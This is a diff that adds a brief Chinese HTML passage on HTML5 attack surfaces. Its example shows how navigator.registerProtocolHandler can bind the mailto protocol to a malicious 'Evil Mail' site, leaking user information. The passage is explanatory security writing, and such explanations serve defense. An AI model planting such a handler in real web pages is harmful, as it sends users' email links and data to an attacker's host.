@@ -1,0 +1,12 @@
+<p>允许网站将自己注册成为一个给定MIME类型的内容的处理程序.</p>
+<p>
+	 HTML5里有许多协议、模式和API，可能成为攻击者的攻击途径。
+
+        一、registerProtocolHandler：信息泄漏
+
+        HTML5允许某些协议和schema注册为新的特性。例如下面的语句可以注册一个email handler。
+
+[html] view plaincopy
+navigator.registerProtocolHandler(“mailto”,“http://www.f.com/?uri=%s", “Evil Mail");  
+        它会将一个恶意网站处理器关联到mailto这个协议上，所以它在某些情况下的滥用会导致用户信息泄漏。
+</p>
